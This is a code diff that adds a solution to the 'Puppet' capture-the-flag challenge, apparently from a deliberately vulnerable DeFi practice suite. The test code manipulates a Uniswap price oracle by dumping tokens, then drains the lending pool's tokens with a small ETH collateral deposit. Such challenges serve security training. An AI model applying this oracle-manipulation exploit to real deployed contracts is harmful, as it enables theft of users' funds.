@@ -95,6 +95,27 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // We first reduce the token price by swapping on Uniswap
+        console.log('Initial ETH: ', await player.getBalance(), ' - Initial Token: ', await token.balanceOf(player.address));
+        await token.connect(player).approve(uniswapExchange.address, await token.balanceOf(player.address));
+        await uniswapExchange.connect(player).tokenToEthSwapInput(
+            await token.balanceOf(player.address),
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+        console.log('After swap ETH: ', await player.getBalance(), ' - After swap Token: ', await token.balanceOf(player.address));
+
+        // We then borrow as much tokens as possible
+        const depositForOneToken = BigInt(await lendingPool.calculateDepositRequired(10n ** 18n));
+        let tokensToBorrow = BigInt(await player.getBalance()) / depositForOneToken * 10n ** 18n;
+        const maxTokensToBorrow = await token.balanceOf(lendingPool.address);
+        console.log('Max Tokens: ', maxTokensToBorrow, ' - Tokens to borrow: ', tokensToBorrow);
+        if (tokensToBorrow > maxTokensToBorrow) {
+            tokensToBorrow = maxTokensToBorrow;
+        }
+        const sendEth = await lendingPool.calculateDepositRequired(tokensToBorrow)
+        await lendingPool.connect(player).borrow(tokensToBorrow, player.address, {value: sendEth});
+        console.log('After borrow ETH: ', await player.getBalance(), ' - After borrow Token: ', await token.balanceOf(player.address));
     });
 
     after(async function () {
